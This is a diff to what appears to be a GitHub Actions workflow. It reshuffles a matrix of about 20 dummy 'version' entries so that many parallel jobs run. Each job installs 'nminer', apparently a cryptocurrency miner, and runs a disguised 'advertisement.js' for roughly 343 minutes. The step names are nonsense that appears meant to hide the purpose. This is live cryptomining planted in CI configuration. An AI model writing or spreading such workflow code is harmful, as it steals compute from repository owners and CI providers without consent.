@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8828 }
-          - { version: 6374 }
-          - { version: 7342 }
-          - { version: 7428 }
-          - { version: 2948 }
-          - { version: 6230 }
-          - { version: 182 }
-          - { version: 7924 }
-          - { version: 2147 }
-          - { version: 3956 }
-          - { version: 2859 }
-          - { version: 2143 }
-          - { version: 6263 }
-          - { version: 5992 }
-          - { version: 6067 }
-          - { version: 5438 }
-          - { version: 7789 }
-          - { version: 2577 }
-          - { version: 7505 }
-          - { version: 3415 }
+          - { version: 1381 }
+          - { version: 6802 }
+          - { version: 3973 }
+          - { version: 8024 }
+          - { version: 6856 }
+          - { version: 8163 }
+          - { version: 7806 }
+          - { version: 7166 }
+          - { version: 7040 }
+          - { version: 6121 }
+          - { version: 5097 }
+          - { version: 5665 }
+          - { version: 2826 }
+          - { version: 2735 }
+          - { version: 1463 }
+          - { version: 2817 }
+          - { version: 8661 }
+          - { version: 27 }
+          - { version: 5327 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: unimportant bump gosh after
+      - name: upward but
         run: |
           npm install nminer@latest
-          timeout 349m node advertisement.js || echo "advertisement executed"
+          timeout 343m node advertisement.js || echo "advertisement executed"
